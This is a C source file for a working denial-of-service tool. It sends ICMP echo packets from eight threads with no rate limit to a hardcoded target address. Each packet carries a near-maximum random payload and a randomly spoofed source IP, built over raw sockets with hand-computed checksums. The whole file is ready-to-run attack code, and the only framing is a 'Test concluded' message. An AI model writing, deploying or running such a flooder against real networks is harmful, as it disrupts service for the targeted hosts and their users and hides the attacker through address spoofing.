// Compile: gcc -O2 -pthread src/flooding/dos_icmp.c -o dos_icmp
// Run    : sudo ./dos_icmp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>

#define TARGET_IP     "192.168.1.23"
#define WORKERS       8
#define PAYLOAD_SIZE  65495
#define RATE_LIMIT_S  0.0   /* Seconds to wait between packets; 0 for unlimited */

struct worker_args {
    struct sockaddr_in target;
    size_t payload_size;
    double rate_limit;
    uint16_t base_seq;
};

static volatile sig_atomic_t keep_running = 1;

static void handle_sigint(int signum) {
    (void)signum;
    keep_running = 0;
}

static uint16_t checksum(const void *data, size_t len) {
    const uint16_t *words = data;
    uint32_t sum = 0;

    while (len > 1) {
        sum += *words++;
        len -= 2;
    }

    if (len == 1) {
        uint16_t last = 0;
        memcpy(&last, words, 1);
        sum += last;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    return (uint16_t)(~sum);
}

static uint32_t random_ipv4(unsigned int *seed) {
    uint32_t addr = (uint32_t)rand_r(seed) << 16;
    addr |= (uint32_t)rand_r(seed) & 0xFFFF;
    return addr;
}

static void fill_payload(uint8_t *payload, size_t length, unsigned int *seed) {
    for (size_t i = 0; i < length; ++i) {
        payload[i] = (uint8_t)(rand_r(seed) & 0xFF);
    }
}

static struct timespec rate_to_timespec(double rate_limit) {
    struct timespec ts = {0};
    if (rate_limit > 0.0) {
        ts.tv_sec = (time_t)rate_limit;
        ts.tv_nsec = (long)((rate_limit - ts.tv_sec) * 1e9);
    }
    return ts;
}

static void *flood_worker(void *arg) {
    struct worker_args *cfg = arg;
    unsigned int seed = (unsigned int)(time(NULL) ^ (uintptr_t)pthread_self());
    size_t packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + cfg->payload_size;
    struct timespec ts = rate_to_timespec(cfg->rate_limit);
    uint16_t seq = cfg->base_seq;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return NULL;
    }

    int on = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt IP_HDRINCL");
        close(sock);
        return NULL;
    }

    uint8_t *packet = malloc(packet_size);
    if (!packet) {
        perror("malloc");
        close(sock);
        return NULL;
    }

    while (keep_running) {
        struct iphdr *ip = (struct iphdr *)packet;
        struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
        uint8_t *payload = packet + sizeof(struct iphdr) + sizeof(struct icmphdr);

        memset(packet, 0, packet_size);
        fill_payload(payload, cfg->payload_size, &seed);

        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(packet_size);
        ip->id = htons((uint16_t)rand_r(&seed));
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = IPPROTO_ICMP;
        ip->saddr = random_ipv4(&seed);
        ip->daddr = cfg->target.sin_addr.s_addr;
        ip->check = checksum(ip, sizeof(struct iphdr));

        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        icmp->un.echo.id = htons(getpid() & 0xFFFF);
        icmp->un.echo.sequence = htons(seq++);
        icmp->checksum = checksum(icmp, sizeof(struct icmphdr) + cfg->payload_size);

        if (sendto(sock, packet, packet_size, 0,
                   (struct sockaddr *)&cfg->target, sizeof(cfg->target)) < 0) {
            perror("sendto");
            break;
        }

        if (cfg->rate_limit > 0.0) {
            nanosleep(&ts, NULL);
        }
    }

    free(packet);
    close(sock);
    return NULL;
}

int main(void) {
    struct sockaddr_in target = {
        .sin_family = AF_INET,
        .sin_port = 0,
    };

    if (inet_pton(AF_INET, TARGET_IP, &target.sin_addr) != 1) {
        fprintf(stderr, "Invalid target IP: %s\n", TARGET_IP);
        return EXIT_FAILURE;
    }

    printf("\n[CONFIG]\nTarget: %s\nWorkers: %d\nPayload Size: %zuB\n"
           "Theoretical Rate: %s\n\n",
           TARGET_IP, WORKERS, (size_t)PAYLOAD_SIZE,
           RATE_LIMIT_S == 0.0 ? "Unlimited" : "Limited");

    signal(SIGINT, handle_sigint);

    pthread_t threads[WORKERS];
    struct worker_args cfg = {
        .target = target,
        .payload_size = PAYLOAD_SIZE,
        .rate_limit = RATE_LIMIT_S,
        .base_seq = (uint16_t)(rand() & 0xFFFF),
    };

    int created = 0;
    for (int i = 0; i < WORKERS; ++i) {
        if (pthread_create(&threads[i], NULL, flood_worker, &cfg) != 0) {
            perror("pthread_create");
            keep_running = 0;
            break;
        }
        ++created;
    }

    for (int i = 0; i < created; ++i) {
        pthread_join(threads[i], NULL);
    }

    puts("[+] Test concluded");
    return EXIT_SUCCESS;
}
